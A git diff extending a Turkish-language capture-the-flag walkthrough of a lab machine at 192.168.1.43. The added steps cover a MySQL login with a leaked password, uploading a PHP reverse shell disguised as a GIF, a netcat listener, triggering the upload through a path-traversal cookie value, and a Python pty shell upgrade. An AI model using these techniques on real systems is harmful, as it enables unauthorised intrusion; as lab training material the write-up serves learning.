@@ -7,7 +7,9 @@ Bu komut kullanılarak makinan hangi IP de çalıştığını bulduk.
 2. namp -p- 192.168.1.43
 Bu komut ile ip üzerinde hangi Portların açık olduğuna baktık.
 80: http
-3304: mysql
+111: rpcbind
+3306: mysql
+39940: unknown
 
 3. dirb http://192.168.1.43
 Bu komut ile site buluna gizli sayfalar var mı kontrol ettik.
@@ -36,4 +38,28 @@ Bu komut ile site üzerinde gili buluna sayfaların taramsını yaptık
 bu komutu kullanarak php dosyalarının içeriğini base64 olarak aldık ve 
 config.php içerisinde mysql sifresini elde ettik.
 
-8.
+8. mysql -u root -h 192.168.1.43 -p
+MySQL bağlantısını kurduk
+
+9. Reverse Shell php kodundaki IP ve Portu değişip siteye upload edilmesi gerekiyor. 
+Ste image uzantılarını yükleye bildiği için php dosyasını kabul etiyecektir. bunun için php uzantısını gif formatında yükleme
+yapmamız gerekicektir dosya içeriğne de GIF98 yazılması gerekir. Dosyamız başarılı olarak yüklenir.
+
+10. nc -lvp 1234
+NetCat ile yüklenen reverse shell dosyanın portu dinleceğiz.
+
+11. BurpSuite kullannarak yüklediğimiz gif dosyasını çalıştrmamız gerekiyor. Bunun için Cookieleri kullanabiliriz
+burpsuite ile gelen cookie bilgisini değişip yerine gif dosyasının yolu veriyoruz örn: Cookie: lang=/../upload/3208fd203ca8fdfa13bc98a4832c1396.gif
+isteği gönderdiğimizde shell komutumuz bizi içeri alıcaktır. Fakat burada içeri girmemiz "su" komutunu çalıştıramıyoruz. bunun iiçin
+python ile bir shell komutu çalıştırmamız gerekir.
+
+12. Python shell kodu
+echo "import pty; pty.spawn('/bin/bash');" > /tmp/shell.py
+python /tmp/shell.py
+ve bu code sayesinde bit üst seviye daha çıkmış bulunuyoruz.
+
+13. /home/ dizini altında 4 kişi var bunlar dan kent ve kane sifresi MySQL deki ile aynı. Kane klasörü içerisinde msgmike
+adında çalıştırıla bilir bir dosya var çalıştığında mike altına bir msg.txt file oluşturdu.
+
+https://sniferl4bs.com
+
